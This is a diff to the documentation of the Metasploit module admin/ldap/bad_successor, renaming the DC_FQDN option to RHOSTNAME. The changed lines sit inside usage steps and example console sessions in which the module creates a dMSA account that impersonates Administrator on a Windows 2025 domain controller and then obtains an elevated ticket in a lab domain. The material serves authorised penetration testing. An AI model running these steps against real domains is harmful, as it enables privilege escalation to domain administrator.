@@ -82,7 +82,7 @@ There are two kind of actions the module can run:
 1. Create a dMSA account and set it to impersonate Administrator:
 1. Do: `use admin/ldap/bad_successor`
 1. Do: `set ACTION CREATE_DMSA`
-1. Do: `set DC_FQDN <domain controller FQDN>`
+1. Do: `set RHOSTNAME <domain controller FQDN>`
 1. Do: `set DMSA_ACCOUNT_NAME <dMSA account name>`
 1. Do: `set ACCOUNT_TO_IMPERSONATE Administrator`
 1. Do: `set LDAPDomain <domain name>`
@@ -114,8 +114,8 @@ The fully qualified domain name (FQDN) of the domain controller.
 ### Action: CREATE_DMSA
 #### Create dMSA on a Windows 2025 Domain Controller
 ```
-msf auxiliary(admin/ldap/bad_successor) > set DC_FQDN dc5.msf.test
-DC_FQDN => dc5.msf.test
+msf auxiliary(admin/ldap/bad_successor) > set RHOSTNAME dc5.msf.test
+RHOSTNAME => dc5.msf.test
 msf auxiliary(admin/ldap/bad_successor) > set DMSA_ACCOUNT_NAME attacker_dMSA
 DMSA_ACCOUNT_NAME => attacker_dMSA
 msf auxiliary(admin/ldap/bad_successor) > set LDAPDomain msf.test
@@ -144,8 +144,8 @@ msf auxiliary(admin/ldap/bad_successor) > run
 ### Action: GET_TICKET
 #### Elevate privileges using the created dMSA
 ```
-msf auxiliary(admin/ldap/bad_successor) > set DC_FQDN dc5.msf.test
-DC_FQDN => dc5.msf.test
+msf auxiliary(admin/ldap/bad_successor) > set RHOSTNAME dc5.msf.test
+RHOSTNAME => dc5.msf.test
 msf auxiliary(admin/ldap/bad_successor) > set DMSA_ACCOUNT_NAME attacker_dMSA
 DMSA_ACCOUNT_NAME => attacker_dMSA
 msf auxiliary(admin/ldap/bad_successor) > set LDAPDomain msf.test
